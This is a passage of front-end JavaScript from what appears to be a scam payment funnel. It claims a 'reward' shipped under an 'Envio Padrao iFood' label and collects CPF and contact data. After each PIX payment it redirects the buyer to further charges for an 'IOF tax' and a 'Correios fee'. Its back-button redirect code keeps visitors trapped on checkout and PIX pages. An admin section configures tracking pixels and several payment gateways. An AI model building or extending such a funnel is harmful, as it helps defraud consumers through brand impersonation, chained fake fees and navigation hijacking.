    if (reward && pixOrderTitle) {
        pixOrderTitle.textContent = String(pix?.rewardName || reward.pixTitle || reward.name);
    }
    if (reward && pixOrderImage) {
        pixOrderImage.src = String(pix?.rewardAsset || reward.asset);
        pixOrderImage.alt = String(pix?.rewardAlt || reward.pixAlt || reward.name);
    }
    if (pixCode) pixCode.value = pix.paymentCode || '';
    if (pixIofCode) pixIofCode.value = pix.paymentCode || '';
    if (pixCorreiosCode) pixCorreiosCode.value = pix.paymentCode || '';

    const buildPixQrFallbackUrl = (codeText = '') => {
        const clean = String(codeText || '').trim();
        if (!clean) return '';
        const url = new URL('https://quickchart.io/qr');
        url.searchParams.set('text', clean);
        url.searchParams.set('size', '620');
        url.searchParams.set('margin', '2');
        url.searchParams.set('ecLevel', 'M');
        return url.toString();
    };

    const applyPixQrSource = (qrUrl, qrBase64, fallbackCode = '') => {
        const qrTargets = [pixQr, pixIofQr, pixCorreiosQr].filter(Boolean);
        if (!qrTargets.length) return;
        const qrSource = String(qrUrl || qrBase64 || '').trim();
        const src = qrSource
            ? ((/^https?:\/\//i.test(qrSource) || qrSource.startsWith('data:image'))
                ? qrSource
                : `data:image/png;base64,${qrSource}`)
            : buildPixQrFallbackUrl(fallbackCode);
        if (!src) return;
        qrTargets.forEach((img) => {
            img.src = src;
        });
    };

    const hasPixQrData = () => Boolean(
        String(pix?.paymentQrUrl || '').trim() ||
        String(pix?.paymentCodeBase64 || '').trim() ||
        String(pix?.paymentCode || '').trim()
    );

    const setPixQrSectionVisible = (visible) => {
        if (!pixQrSection) return;
        pixQrSection.classList.toggle('hidden', !visible);
        pixQrSection.setAttribute('aria-hidden', visible ? 'false' : 'true');
    };

    const syncPixQrButtonState = () => {
        if (!btnShowPixQr) return;
        btnShowPixQr.disabled = !hasPixQrData();
    };

    if ((pixQr || pixIofQr || pixCorreiosQr) && (pix.paymentQrUrl || pix.paymentCodeBase64 || pix.paymentCode)) {
        applyPixQrSource(pix.paymentQrUrl, pix.paymentCodeBase64, pix.paymentCode);
    }
    syncPixQrButtonState();

    const PIX_AUTO_RETRY_MAX = 2;
    let pixRegenerationBusy = false;

    const sanitizePixAutoRetryToken = (value = '', fallback = 'pix') => {
        const clean = String(value || '')
            .trim()
            .toLowerCase()
            .replace(/[^a-z0-9_-]/g, '');
        return clean || fallback;
    };

    const getPixAutoRetryBucketKey = () => {
        const sessionToken = sanitizePixAutoRetryToken(getLeadSessionId(), 'session');
        const kindToken = isUpsellPix
            ? sanitizePixAutoRetryToken(
                pix?.upsell?.kind ||
                pix?.shippingId ||
                pix?.shippingName ||
                'upsell',
                'upsell'
            )
            : 'base';
        return `${sessionToken}:${kindToken}`;
    };

    const loadPixAutoRetryMap = () => {
        try {
            const raw = sessionStorage.getItem(STORAGE_KEYS.pixAutoRetryState);
            if (!raw) return {};
            const parsed = JSON.parse(raw);
            if (!parsed || typeof parsed !== 'object' || Array.isArray(parsed)) return {};
            return parsed;
        } catch (_error) {
            return {};
        }
    };

    const savePixAutoRetryMap = (map = {}) => {
        try {
            sessionStorage.setItem(STORAGE_KEYS.pixAutoRetryState, JSON.stringify(map || {}));
        } catch (_error) {}
    };

    const getPixAutoRetryBucket = () => {
        const key = getPixAutoRetryBucketKey();
        const map = loadPixAutoRetryMap();
        const bucket = map[key];
        if (!bucket || typeof bucket !== 'object' || Array.isArray(bucket)) {
            return { key, map, bucket: { total: 0, txids: {} } };
        }
        return {
            key,
            map,
            bucket: {
                total: Number(bucket.total || 0) || 0,
                txids: bucket.txids && typeof bucket.txids === 'object' && !Array.isArray(bucket.txids)
                    ? bucket.txids
                    : {}
            }
        };
    };

    const canAutoRetryPixTxid = (txid = '') => {
        const cleanTxid = String(txid || '').trim();
        if (!cleanTxid) return false;
        const { bucket } = getPixAutoRetryBucket();
        if (bucket.total >= PIX_AUTO_RETRY_MAX) return false;
        return !bucket.txids[cleanTxid];
    };

    const markAutoRetryPixTxid = (txid = '') => {
        const cleanTxid = String(txid || '').trim();
        if (!cleanTxid) return;
        const { key, map, bucket } = getPixAutoRetryBucket();
        map[key] = {
            total: bucket.total + 1,
            txids: {
                ...bucket.txids,
                [cleanTxid]: Date.now()
            }
        };
        savePixAutoRetryMap(map);
    };

    const resolvePixRetryBumpPrice = () => {
        if (isUpsellPix) return 0;
        const bumpData = loadBump() || {};
        const bumpSelected = bumpData?.selected === true && Number(bumpData?.price || 0) > 0;
        return bumpSelected ? Number(bumpData.price || 0) : 0;
    };

    const resolvePixRetryShipping = () => {
        if (isUpsellPix) {
            const upsellPrice = Number(pix?.upsell?.price || 0) > 0
                ? Number(pix.upsell.price || 0)
                : Math.max(0, Number((Number(pix?.amount || 0) - rewardExtraPrice).toFixed(2)));
            if (!Number.isFinite(upsellPrice) || upsellPrice <= 0) return null;
            return {
                id: String(pix?.shippingId || pix?.upsell?.kind || 'upsell_pix').trim() || 'upsell_pix',
                name: String(pix?.shippingName || pix?.upsell?.title || 'Pagamento via PIX').trim() || 'Pagamento via PIX',
                eta: '',
                price: Number(upsellPrice.toFixed(2)),
                basePrice: Number(upsellPrice.toFixed(2)),
                originalPrice: Number(upsellPrice.toFixed(2)),
                selectedAt: Date.now()
            };
        }

        if (isShippingSelectionComplete(shipping)) {
            return shipping;
        }

        const bumpPrice = resolvePixRetryBumpPrice();
        const fallbackShippingBase = Math.max(
            0,
            Number((Number(pix?.amount || 0) - bumpPrice - rewardExtraPrice).toFixed(2))
        );
        if (fallbackShippingBase <= 0) return null;
        const coupon = loadCoupon();
        const amountOff = Number(coupon?.amountOff || 0) || roundMoney(25.9 * Number(coupon?.discount || 0));
        const fallbackShippingOriginal = amountOff > 0
            ? Number((fallbackShippingBase + amountOff).toFixed(2))
            : fallbackShippingBase;

        return {
            id: String(pix?.shippingId || 'padrao').trim() || 'padrao',
            name: String(pix?.shippingName || 'Envio Padrao iFood').trim() || 'Envio Padrao iFood',
            eta: '',
            price: fallbackShippingBase,
            basePrice: fallbackShippingOriginal,
            originalPrice: fallbackShippingOriginal,
            selectedAt: Date.now(),
            coupon: coupon?.code,
            amountOff,
            discountApplied: amountOff > 0
        };
    };

    const resolvePixRetryOptions = (currentTxid = '') => {
        if (!isUpsellPix) {
            return { sourceStage: 'pix_auto_retry_refused' };
        }
        return {
            sourceStage: 'pix_auto_retry_refused',
            upsell: {
                enabled: true,
                kind: String(pix?.upsell?.kind || pix?.shippingId || 'upsell').trim() || 'upsell',
                title: String(pix?.upsell?.title || pix?.shippingName || 'Prioridade de envio').trim() || 'Prioridade de envio',
                price: Number(pix?.upsell?.price || pix?.amount || 0),
                previousTxid: String(currentTxid || pix?.upsell?.previousTxid || '').trim(),
                targetAfterPaid: String(pix?.upsell?.targetAfterPaid || '').trim()
            }
        };
    };

    const attemptAutoRegeneratePix = async (statusRaw = '') => {
        const currentTxid = String(pix?.idTransaction || '').trim();
        if (!currentTxid || pixRegenerationBusy || !canAutoRetryPixTxid(currentTxid)) {
            return false;
        }

        const nextShipping = resolvePixRetryShipping();
        if (!nextShipping) {
            return false;
        }

        const bumpPrice = resolvePixRetryBumpPrice();
        const refusedAt = new Date().toISOString();
        pixRegenerationBusy = true;
        inactiveStatusShown = true;
        markAutoRetryPixTxid(currentTxid);
        clearStatusPolling();

        Object.assign(pix, {
            status: 'refused',
            statusRaw: String(statusRaw || 'refused'),
            refusedAt
        });
        savePix({
            ...pix,
            status: 'refused',
            statusRaw: String(statusRaw || 'refused'),
            refusedAt
        });

        showToast('PIX inativo. Gerando um novo automaticamente...', 'info');

        try {
            await createPixCharge(nextShipping, bumpPrice, resolvePixRetryOptions(currentTxid));
            return true;
        } catch (error) {
            pixRegenerationBusy = false;
            if (!statusPollTimer) {
                statusPollTimer = setInterval(pollPixStatus, pollIntervalMs);
            }
            showToast(error?.message || 'Nao foi possivel gerar um novo PIX automaticamente.', 'error');
            return false;
        }
    };

    const handleCopy = async (button, inputEl = pixCode) => {
        const sourceInput = inputEl || pixCode || pixIofCode || pixCorreiosCode;
        if (!sourceInput) return;
        const value = sourceInput.value || '';
        if (!value) return;
        const isIcon = button && button.id === 'btn-copy-pix-icon';
        const isIofButton = button && button.id === 'btn-copy-pix-iof';
        const isCorreiosButton = button && button.id === 'btn-copy-pix-correios';
        const resetLabel = () => {
            if (!button) return;
            if (isIcon) {
                button.classList.remove('pix-copy-icon--done');
            } else if (isIofButton || isCorreiosButton) {
                button.textContent = 'COPIAR';
            } else {
                button.textContent = 'Copiar';
            }
        };
        try {
            await navigator.clipboard.writeText(value);
        } catch (_error) {
            sourceInput.select();
            document.execCommand('copy');
        }
        if (button) {
            if (isIcon) {
                button.classList.add('pix-copy-icon--done');
            } else if (isIofButton || isCorreiosButton) {
                button.textContent = 'COPIADO!';
            } else {
                button.textContent = 'Copiado!';
            }
            setTimeout(resetLabel, 1600);
        }
    };

    btnCopy?.addEventListener('click', () => handleCopy(btnCopy, pixCode));
    btnShowPixQr?.addEventListener('click', () => {
        if (!hasPixQrData()) return;
        applyPixQrSource(pix?.paymentQrUrl, pix?.paymentCodeBase64, pix?.paymentCode);
        const shouldShow = pixQrSection?.classList.contains('hidden');
        setPixQrSectionVisible(!!shouldShow);
        if (shouldShow) {
            pixQrSection?.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
        }
    });
    btnCopyIcon?.addEventListener('click', () => handleCopy(btnCopyIcon, pixCode));
    btnCopyIof?.addEventListener('click', () => handleCopy(btnCopyIof, pixIofCode));
    btnCopyCorreios?.addEventListener('click', () => handleCopy(btnCopyCorreios, pixCorreiosCode));

    if (pixOrderId) {
        const id = String(pix.idTransaction || '').trim();
        pixOrderId.textContent = id ? id.slice(-6) : '—';
    }

    if (pixTimer && pixProgress) {
        const totalSeconds = 600;
        const createdAt = pix.createdAt || Date.now();
        const endTime = createdAt + totalSeconds * 1000;

        let timerId = null;
        const updateTimer = () => {
            const remaining = Math.max(0, endTime - Date.now());
            const minutes = Math.floor(remaining / 60000);
            const seconds = Math.floor((remaining % 60000) / 1000);
            pixTimer.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
            const pct = (remaining / (totalSeconds * 1000)) * 100;
            pixProgress.style.width = `${Math.max(0, pct)}%`;
            if (remaining <= 0) {
                if (timerId) clearInterval(timerId);
            }
        };

        updateTimer();
        timerId = setInterval(updateTimer, 1000);
    }

    let statusPollTimer = null;
    let pollingBusy = false;
    let redirectedToUpsell = false;
    let inactiveStatusShown = false;
    const sentPurchaseByTxid = new Set();

    const clearStatusPolling = () => {
        if (statusPollTimer) {
            clearInterval(statusPollTimer);
            statusPollTimer = null;
        }
    };

    const resolveUpsellPaidRedirect = () => {
        if (upsellTargetAfterPaid) return upsellTargetAfterPaid;
        if (isIofUpsellPix) return 'upsell-correios.html';
        if (isCorreiosUpsellPix) return 'upsell.html';
        return 'upsell.html?paid=1';
    };

    const resolveStageFromRedirect = (targetUrl) => {
        const normalized = String(targetUrl || '').trim().toLowerCase();
        if (!normalized) return 'upsell';
        if (normalized.includes('upsell-iof')) return 'upsell_iof';
        if (normalized.includes('upsell-correios')) return 'upsell_correios';
        if (normalized.includes('upsell')) return 'upsell';
        return 'checkout';
    };

    const markPaidAndRedirect = (statusRaw) => {
        if (redirectedToUpsell) return;
        redirectedToUpsell = true;
        clearStatusPolling();

        savePix({
            ...pix,
            status: 'paid',
            statusRaw: String(statusRaw || 'paid'),
            paidAt: new Date().toISOString(),
            upsellPaid: isUpsellPix
        });

        const txid = String(pix?.idTransaction || '').trim();
        if (!txid || !sentPurchaseByTxid.has(txid)) {
            if (txid) sentPurchaseByTxid.add(txid);
            trackLead('pix_paid', {
                stage: 'pix',
                shipping,
                reward,
                pix: {
                    ...pix,
                    idTransaction: txid,
                    statusRaw: String(statusRaw || 'paid')
                },
                amount: Number(pix?.amount || shipping?.price || 0),
                isUpsell: isUpsellPix
            });
        }

        if (isUpsellPix) {
            const paidTarget = resolveUpsellPaidRedirect();
            const targetStage = resolveStageFromRedirect(paidTarget);
            const redirectEvent = isIofUpsellPix
                ? 'upsell_iof_pix_paid_redirect'
                : (isCorreiosUpsellPix ? 'upsell_correios_pix_paid_redirect' : 'upsell_pix_paid_redirect');
            trackLead(redirectEvent, {
                stage: 'pix',
                shipping,
                pix: {
                    txid: pix?.idTransaction || '',
                    statusRaw: String(statusRaw || 'paid')
                }
            });
            showToast(
                isIofUpsellPix
                    ? 'Pagamento confirmado. Seguindo para a taxa dos Correios.'
                    : (isCorreiosUpsellPix
                        ? 'Pagamento confirmado. Seguindo para o adiantamento do frete.'
                        : 'Pagamento confirmado. Prioridade ativada.'),
                'success'
            );
            if (pixIofStatus) pixIofStatus.textContent = 'Status: Pagamento confirmado';
            if (pixCorreiosStatus) pixCorreiosStatus.textContent = 'Status: Pagamento confirmado';
            setStage(targetStage);
            setTimeout(() => {
                redirect(paidTarget);
            }, 900);
            return;
        }

        trackLead('pix_paid_redirect_upsell_iof', {
            stage: 'pix',
            shipping,
            pix: {
                txid: pix?.idTransaction || '',
                statusRaw: String(statusRaw || 'paid')
            }
        });
        showToast('Pagamento confirmado. Vamos liberar sua taxa de IOF.', 'success');
        if (pixIofStatus) pixIofStatus.textContent = 'Status: Pagamento confirmado';
        if (pixCorreiosStatus) pixCorreiosStatus.textContent = 'Status: Pagamento confirmado';
        setStage('upsell_iof');
        setTimeout(() => {
            redirect('upsell-iof.html');
        }, 900);
    };

    const normalizePixStatus = (value) => {
        return String(value || '')
            .trim()
            .toLowerCase()
            .replace(/\s+/g, '_')
            .replace(/-+/g, '_');
    };

    const postPixStatusWithSessionRetry = async () => {
        const send = async () => {
            const response = await fetch('/api/pix/status', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                credentials: 'same-origin',
                body: JSON.stringify({
                    txid: pix.idTransaction,
                    sessionId: getLeadSessionId(),
                    gateway: pix.gateway || pix.pixGateway || ''
                })
            });
            const body = await response.json().catch(() => ({}));
            return { response, body };
        };

        let attempt = await send();
        if (isBlockedApiPayload(attempt?.response, attempt?.body)) {
            redirectToBlockedPage();
            return attempt;
        }
        const firstError = String(attempt?.body?.error || '').trim();
        if (!attempt.response.ok && (attempt.response.status === 401 || looksLikeSessionError(firstError))) {
            await ensureApiSession(true).catch(() => null);
            attempt = await send();
            if (isBlockedApiPayload(attempt?.response, attempt?.body)) {
                redirectToBlockedPage();
                return attempt;
            }
        }

        return attempt;
    };

    const pollPixStatus = async () => {
        if (pollingBusy || redirectedToUpsell) return;
        if (!pix?.idTransaction) return;
        pollingBusy = true;

        try {
            const { response: res, body: data } = await postPixStatusWithSessionRetry();
            if (!res.ok) return;

            const nextPaymentCode = String(data?.paymentCode || '').trim();
            const nextPaymentQrUrl = String(data?.paymentQrUrl || '').trim();
            const nextPaymentCodeBase64 = String(data?.paymentCodeBase64 || '').trim();
            const shouldUpdatePix =
                (!String(pix?.paymentCode || '').trim() && !!nextPaymentCode) ||
                (!String(pix?.paymentQrUrl || '').trim() && !!nextPaymentQrUrl) ||
                (!String(pix?.paymentCodeBase64 || '').trim() && !!nextPaymentCodeBase64);
            if (shouldUpdatePix) {
                if (nextPaymentCode && pixCode && !String(pixCode.value || '').trim()) {
                    pixCode.value = nextPaymentCode;
                }
                if (nextPaymentCode && pixIofCode && !String(pixIofCode.value || '').trim()) {
                    pixIofCode.value = nextPaymentCode;
                }
                if (nextPaymentCode && pixCorreiosCode && !String(pixCorreiosCode.value || '').trim()) {
                    pixCorreiosCode.value = nextPaymentCode;
                }
                if (nextPaymentCode || nextPaymentQrUrl || nextPaymentCodeBase64) {
                    applyPixQrSource(nextPaymentQrUrl, nextPaymentCodeBase64, nextPaymentCode || pix.paymentCode || '');
                }
                Object.assign(pix, {
                    paymentCode: pix.paymentCode || nextPaymentCode,
                    paymentQrUrl: pix.paymentQrUrl || nextPaymentQrUrl,
                    paymentCodeBase64: pix.paymentCodeBase64 || nextPaymentCodeBase64
                });
                savePix(pix);
                syncPixQrButtonState();
            }

            const status = normalizePixStatus(data?.status);
            const statusRawText = String(data?.statusRaw || data?.status || '').trim();
            if (pixIofStatus) {
                if (status === 'paid') {
                    pixIofStatus.textContent = 'Status: Pagamento confirmado';
                } else if (status === 'refunded' || status === 'refused') {
                    pixIofStatus.textContent = 'Status: PIX inativo';
                } else {
                    pixIofStatus.textContent = 'Status: Aguardando pagamento';
                }
            }
            if (pixCorreiosStatus) {
                if (status === 'paid') {
                    pixCorreiosStatus.textContent = 'Status: Pagamento confirmado';
                } else if (status === 'refunded' || status === 'refused') {
                    pixCorreiosStatus.textContent = 'Status: PIX inativo';
                } else {
                    pixCorreiosStatus.textContent = 'Status: Aguardando pagamento';
                }
            }
            if (status === 'paid') {
                markPaidAndRedirect(data?.statusRaw);
                return;
            }

            if (status === 'refused') {
                const regenerated = await attemptAutoRegeneratePix(statusRawText);
                if (regenerated) {
                    return;
                }
            }

            if (!inactiveStatusShown && (status === 'refunded' || status === 'refused')) {
                inactiveStatusShown = true;
                showToast('Esse PIX nao esta mais ativo. Gere um novo para continuar.', 'error');
            }
        } catch (_error) {
            // Ignore transient errors during status polling.
        } finally {
            pollingBusy = false;
        }
    };

    if (pix?.paidAt) {
        markPaidAndRedirect(pix?.statusRaw || pix?.status || 'paid');
        return;
    }

    const missingPixVisualData = !String(pix?.paymentCode || '').trim() && !String(pix?.paymentQrUrl || pix?.paymentCodeBase64 || '').trim();
    const pollIntervalMs = missingPixVisualData ? 2500 : 5000;

    ensureApiSession()
        .catch(() => null)
        .finally(() => {
            pollPixStatus();
            statusPollTimer = setInterval(pollPixStatus, pollIntervalMs);
        });
    window.addEventListener('pagehide', clearStatusPolling, { once: true });
    window.addEventListener('beforeunload', clearStatusPolling, { once: true });
}

function toRootRelativePath(rawUrl = '') {
    const text = String(rawUrl || '').trim();
    if (!text) return '';
    if (/^(?:[a-z][a-z0-9+.-]*:|\/\/)/i.test(text) || text.startsWith('#')) {
        return text;
    }
    if (text.startsWith('?')) {
        return `${window.location.pathname}${text}`;
    }

    let normalized = text.replace(/^\.\/+/, '');
    if (normalized === 'index' || normalized === 'index.html') {
        return '/';
    }
    normalized = normalized.replace(/\.html(?=$|\?)/i, '');
    return normalized.startsWith('/') ? normalized : `/${normalized}`;
}

function resolvePaidPixTarget(pix) {
    const pixData = pix && typeof pix === 'object' ? pix : null;
    if (!pixData || !isPixPaid(pixData)) return '';

    const explicitTarget = String(pixData?.upsell?.targetAfterPaid || '').trim();
    if (explicitTarget) return explicitTarget;

    const isUpsellPix = Boolean(pixData?.isUpsell || pixData?.upsell?.enabled);
    if (!isUpsellPix) return 'upsell-iof.html';

    const kind = String(pixData?.upsell?.kind || '').trim().toLowerCase();
    const hints = [
        String(pixData?.shippingId || '').trim().toLowerCase(),
        String(pixData?.shippingName || '').trim().toLowerCase(),
        String(pixData?.upsell?.title || '').trim().toLowerCase()
    ].join(' ');
    if (/iof/.test(kind) || /iof/.test(hints)) return 'upsell-correios.html';
    if (/correios|objeto_grande|objeto grande/.test(kind) || /correios|objeto_grande|objeto grande/.test(hints)) return 'upsell.html';

    return 'upsell.html?paid=1';
}

function buildBackRedirectUrl(pageOverride) {
    const params = new URLSearchParams(window.location.search || '');
    const withDirectMode = (basePath) => {
        params.set('dc', '1');
        const query = params.toString();
        return `${basePath}${query ? `?${query}` : ''}`;
    };
    const directCheckoutUrl = () => {
        return withDirectMode('checkout.html');
    };
    const directProcessingUrl = () => {
        return withDirectMode('processando.html');
    };

    const page = pageOverride || document.body?.dataset?.page || '';
    const personal = loadPersonal();
    const address = loadAddress();
    const shipping = loadShipping();
    const pix = loadPix();
    const pixPaid = isPixPaid(pix);
    const pixPending = !!pix && !pixPaid;
    const hasPersonalCore = !!(
        personal?.name &&
        personal?.cpf &&
        personal?.birth &&
        personal?.email &&
        personal?.phone
    );
    const hasAddress = !!address;
    const hasShipping = !!shipping;
    const hasPix = !!pix;
    const hasAnyFunnelProgress = hasPersonalCore || hasAddress || hasShipping || hasPix;
    const canOpenVsl = hasPersonalCore && hasAddress;
    const mustShowVslFirst = !isVslCompleted();

    if (page === 'home' && !hasAnyFunnelProgress) {
        return 'quiz.html';
    }

    if (mustShowVslFirst) {
        return canOpenVsl ? 'processando.html' : directProcessingUrl();
    }

    if (pixPending) {
        return 'pix.html';
    }
    if (pixPaid) {
        return resolvePaidPixTarget(pix) || 'upsell-iof.html';
    }

    switch (page) {
        case 'home':
            return 'quiz.html';
        case 'quiz':
            return hasPersonalCore ? (hasAddress ? directCheckoutUrl() : 'endereco.html') : 'dados.html';
        case 'personal':
            return hasAddress ? directCheckoutUrl() : 'endereco.html';
        case 'cep':
            return hasAddress ? directCheckoutUrl() : 'endereco.html';
        case 'processing':
            return 'sucesso.html';
        case 'success':
            return directCheckoutUrl();
        case 'checkout':
            // Backredirect no checkout deve manter o lead no checkout (nao avancar para orderbump).
            return directCheckoutUrl();
        case 'orderbump':
            if (pixPending) return 'pix.html';
            if (shipping) return 'orderbump.html';
            return directCheckoutUrl();
        case 'pix':
            return pixPending ? 'pix.html' : directCheckoutUrl();
        case 'upsell-iof':
            return 'upsell-iof.html';
        case 'upsell-correios':
            return 'upsell-correios.html';
        case 'upsell':
            return 'upsell.html';
        default:
            if (pixPending) return 'pix.html';
            if (shipping) return 'orderbump.html';
            return directCheckoutUrl();
    }
}

function normalizeBackRedirectPath(rawUrl) {
    try {
        const parsed = new URL(String(rawUrl || ''), window.location.origin);
        let pathname = String(parsed.pathname || '/').replace(/\/index(?:\.html)?$/i, '/');
        pathname = pathname.replace(/\.html$/i, '');
        if (pathname.length > 1 && pathname.endsWith('/')) pathname = pathname.slice(0, -1);
        return `${pathname}${parsed.search || ''}`;
    } catch (_error) {
        return String(rawUrl || '').trim().replace(/\.html(?=$|\?)/i, '');
    }
}

function buildBackRedirectFallbackUrl(pageOverride) {
    const params = new URLSearchParams(window.location.search || '');
    const page = pageOverride || document.body?.dataset?.page || '';
    const withParams = (basePath, mutateFn) => {
        const qp = new URLSearchParams(params.toString());
        if (typeof mutateFn === 'function') mutateFn(qp);
        const query = qp.toString();
        return `${basePath}${query ? `?${query}` : ''}`;
    };

    switch (page) {
        case 'home':
            return withParams('quiz.html');
        case 'quiz':
            return withParams('dados.html');
        case 'personal':
            return withParams('endereco.html');
        case 'cep':
            return withParams('processando.html');
        case 'processing':
            return withParams('sucesso.html');
        case 'success':
            return withParams('checkout.html', (qp) => {
                qp.set('dc', '1');
            });
        case 'checkout':
            return withParams('checkout.html', (qp) => {
                qp.set('dc', '1');
                qp.set('br', String(Date.now()));
            });
        case 'orderbump':
            return withParams('pix.html', (qp) => {
                qp.set('br', String(Date.now()));
            });
        case 'pix':
            return withParams('checkout.html', (qp) => {
                qp.set('dc', '1');
                qp.set('forceFrete', '1');
                qp.set('br', String(Date.now()));
            });
        case 'upsell-iof':
            return withParams('pix.html', (qp) => {
                qp.set('br', String(Date.now()));
            });
        case 'upsell-correios':
            return withParams('pix.html', (qp) => {
                qp.set('br', String(Date.now()));
            });
        case 'upsell':
            return withParams('pix.html', (qp) => {
                qp.set('br', String(Date.now()));
            });
        default:
            return withParams('checkout.html', (qp) => {
                qp.set('dc', '1');
                qp.set('br', String(Date.now()));
            });
    }
}

function buildDistinctBackRedirectUrl(pageOverride) {
    const target = toRootRelativePath(buildBackRedirectUrl(pageOverride));
    const targetPath = normalizeBackRedirectPath(target);
    const currentPath = normalizeBackRedirectPath(`${window.location.pathname}${window.location.search || ''}`);
    if (targetPath && targetPath !== currentPath) return target;
    return toRootRelativePath(buildBackRedirectFallbackUrl(pageOverride));
}

function initAdmin() {
    const loginWrap = document.getElementById('admin-login');
    const panelWrap = document.getElementById('admin-panel');
    const loginBtn = document.getElementById('admin-login-btn');
    const loginError = document.getElementById('admin-login-error');
    const passwordInput = document.getElementById('admin-password');

    const pixelEnabled = document.getElementById('pixel-enabled');
    const pixelId = document.getElementById('pixel-id');
    const pixelBackupId = document.getElementById('pixel-backup-id');
    const pixelCapiEnabled = document.getElementById('pixel-capi-enabled');
    const pixelCapiToken = document.getElementById('pixel-capi-token');
    const pixelCapiBackupToken = document.getElementById('pixel-capi-backup-token');
    const pixelEventPage = document.getElementById('pixel-event-page');
    const pixelEventQuiz = document.getElementById('pixel-event-quiz');
    const pixelEventLead = document.getElementById('pixel-event-lead');
    const pixelEventCheckout = document.getElementById('pixel-event-checkout');
    const pixelEventPurchase = document.getElementById('pixel-event-purchase');
    const tiktokPixelEnabled = document.getElementById('tiktok-pixel-enabled');
    const tiktokPixelId = document.getElementById('tiktok-pixel-id');
    const tiktokPixelEventPage = document.getElementById('tiktok-pixel-event-page');
    const tiktokPixelEventQuiz = document.getElementById('tiktok-pixel-event-quiz');
    const tiktokPixelEventLead = document.getElementById('tiktok-pixel-event-lead');
    const tiktokPixelEventCheckout = document.getElementById('tiktok-pixel-event-checkout');
    const tiktokPixelEventPurchase = document.getElementById('tiktok-pixel-event-purchase');

    const utmfyEnabled = document.getElementById('utmfy-enabled');
    const utmfyEndpoint = document.getElementById('utmfy-endpoint');
    const utmfyApi = document.getElementById('utmfy-api');
    const pushcutEnabled = document.getElementById('pushcut-enabled');
    const pushcutPixCreated = document.getElementById('pushcut-pix-created');
    const pushcutPixConfirmed = document.getElementById('pushcut-pix-confirmed');
    let pushcutCreatedTitle = document.getElementById('pushcut-created-title');
    let pushcutCreatedMessage = document.getElementById('pushcut-created-message');
    let pushcutConfirmedTitle = document.getElementById('pushcut-confirmed-title');
    let pushcutConfirmedMessage = document.getElementById('pushcut-confirmed-message');
    const paymentsActiveGateway = document.getElementById('payments-active-gateway');
    const paymentsGatewayOrder = document.getElementById('payments-gateway-order');
    const gatewayPriorityCurrent = document.getElementById('gateway-priority-current');
    const gatewayGhostspayEnabled = document.getElementById('gateway-ghostspay-enabled');
    const gatewayGhostspayBaseUrl = document.getElementById('gateway-ghostspay-base-url');
    const gatewayGhostspaySecretKey = document.getElementById('gateway-ghostspay-secret-key');
    const gatewayGhostspayCompanyId = document.getElementById('gateway-ghostspay-company-id');
    const gatewayGhostspayWebhookToken = document.getElementById('gateway-ghostspay-webhook-token');
    const gatewaySunizeEnabled = document.getElementById('gateway-sunize-enabled');
    const gatewaySunizeBaseUrl = document.getElementById('gateway-sunize-base-url');
    const gatewaySunizeApiKey = document.getElementById('gateway-sunize-api-key');
    const gatewaySunizeApiSecret = document.getElementById('gateway-sunize-api-secret');
    const gatewayParadiseEnabled = document.getElementById('gateway-paradise-enabled');
    const gatewayParadiseBaseUrl = document.getElementById('gateway-paradise-base-url');
    const gatewayParadiseApiKey = document.getElementById('gateway-paradise-api-key');
    const gatewayParadiseProductHash = document.getElementById('gateway-paradise-product-hash');
    const gatewayParadiseOrderbumpHash = document.getElementById('gateway-paradise-orderbump-hash');
    const gatewayParadiseSource = document.getElementById('gateway-paradise-source');
    const gatewayParadiseDescription = document.getElementById('gateway-paradise-description');
    const gatewayAtomopayEnabled = document.getElementById('gateway-atomopay-enabled');
    const gatewayAtomopayBaseUrl = document.getElementById('gateway-atomopay-base-url');
    const gatewayAtomopayApiToken = document.getElementById('gateway-atomopay-api-token');
    const gatewayAtomopayOfferHash = document.getElementById('gateway-atomopay-offer-hash');
    const gatewayAtomopayProductHash = document.getElementById('gateway-atomopay-product-hash');
    const gatewayAtomopayIofOfferHash = document.getElementById('gateway-atomopay-iof-offer-hash');
    const gatewayAtomopayIofProductHash = document.getElementById('gateway-atomopay-iof-product-hash');
    const gatewayAtomopayCorreiosOfferHash = document.getElementById('gateway-atomopay-correios-offer-hash');
    const gatewayAtomopayCorreiosProductHash = document.getElementById('gateway-atomopay-correios-product-hash');
    const gatewayAtomopayExpressoOfferHash = document.getElementById('gateway-atomopay-expresso-offer-hash');
    const gatewayAtomopayExpressoProductHash = document.getElementById('gateway-atomopay-expresso-product-hash');
    const gatewayAtomopayWebhookToken = document.getElementById('gateway-atomopay-webhook-token');
    const gatewayGhostspayState = document.getElementById('gateway-ghostspay-state');
    const gatewaySunizeState = document.getElementById('gateway-sunize-state');
    const gatewayParadiseState = document.getElementById('gateway-paradise-state');
    const gatewayAtomopayState = document.getElementById('gateway-atomopay-state');
    const gatewayCards = Array.from(document.querySelectorAll('[data-gateway-card]'));
    const gatewayConfigToggles = Array.from(document.querySelectorAll('[data-gateway-config-toggle]'));
    const gatewayTestBtn = document.getElementById('admin-test-gateways');
    const gatewayTestModal = document.getElementById('gateway-test-modal');
    const gatewayTestClose = document.getElementById('gateway-test-close');
    const gatewayTestAmount = document.getElementById('gateway-test-amount');
    const gatewayTestGhostspay = document.getElementById('gateway-test-ghostspay');
    const gatewayTestSunize = document.getElementById('gateway-test-sunize');
    const gatewayTestParadise = document.getElementById('gateway-test-paradise');
    const gatewayTestAtomopay = document.getElementById('gateway-test-atomopay');
    const gatewayTestGenerate = document.getElementById('gateway-test-generate');
    const gatewayTestReset = document.getElementById('gateway-test-reset');
    const gatewayTestStatus = document.getElementById('gateway-test-status');
    const gatewayTestResults = document.getElementById('gateway-test-results');

    const saveBtn = document.getElementById('admin-save');
    const saveStatus = document.getElementById('admin-save-status');

    const leadsBody = document.getElementById('leads-body');
    const leadsCount = document.getElementById('leads-count');
    const leadsSearch = document.getElementById('leads-search');
    const leadsExportFilter = document.getElementById('leads-export-filter');
    const leadsExport = document.getElementById('leads-export');
    const leadsExportStatus = document.getElementById('leads-export-status');
    const leadsRefresh = document.getElementById('leads-refresh');
    const leadsMore = document.getElementById('leads-more');
    const leadsReconcile = document.getElementById('leads-reconcile');
    const leadsReconcileStatus = document.getElementById('leads-reconcile-status');
    const clonersRefresh = document.getElementById('cloners-refresh');
    const clonersStatus = document.getElementById('cloners-status');
    const clonersTotalDomains = document.getElementById('cloners-total-domains');
